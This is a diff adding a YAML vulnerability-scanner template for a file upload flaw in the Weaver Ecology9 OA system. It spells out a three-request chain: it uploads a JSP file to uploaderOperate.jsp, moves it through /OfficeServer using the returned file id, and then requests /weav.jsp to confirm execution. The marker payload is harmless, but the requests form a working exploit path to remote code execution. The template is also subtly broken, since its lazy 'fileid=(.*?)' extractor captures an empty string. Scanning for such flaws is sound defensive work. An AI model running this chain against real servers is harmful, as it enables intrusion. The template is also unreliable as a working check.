@@ -1,0 +1,84 @@
+id: weaver-ecology9-uploader-file-upload
+info:
+  name: Weaver Ecology9 OA System File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Weaver Ecology9 OA system contains a file upload vulnerability in `uploaderOperate.jsp` which allows attackers to upload JSP files and execute arbitrary code.
+  tags: file-upload
+  reference:
+    - https://www.weaver.com.cn/
+
+http:
+  - id: upload-file
+    raw:
+      - |
+        POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=44d3e4be5e5751d3c0e578e61826e9b2
+
+        --44d3e4be5e5751d3c0e578e61826e9b2
+        Content-Disposition: form-data; name="secId"
+
+        1
+        --44d3e4be5e5751d3c0e578e61826e9b2
+        Content-Disposition: form-data; name="Filedata"; filename="weav.jsp"
+
+        <% out.print("test".hashCode()); %>
+        --44d3e4be5e5751d3c0e578e61826e9b2
+        Content-Disposition: form-data; name="plandetailid"
+
+        1
+        --44d3e4be5e5751d3c0e578e61826e9b2--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "fileid=(.*?)"
+    extractors:
+      - type: regex
+        name: fileid
+        part: body
+        internal: true
+        regex:
+          - "fileid=(.*?)"
+
+  - id: use-file
+    raw:
+      - |
+        POST /OfficeServer HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=9e235be76c2b233433652834efa5d9e4
+
+        --9e235be76c2b233433652834efa5d9e4
+        Content-Disposition: form-data; name="aaa"
+
+        {'OPTION': 'INSERTIMAGE', 'isInsertImageNew': '1', 'imagefileid4pic': '{{fileid}}'}
+        --9e235be76c2b233433652834efa5d9e4--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test"
+
+  - id: verify-upload
+    raw:
+      - |
+        GET /weav.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "3556498"
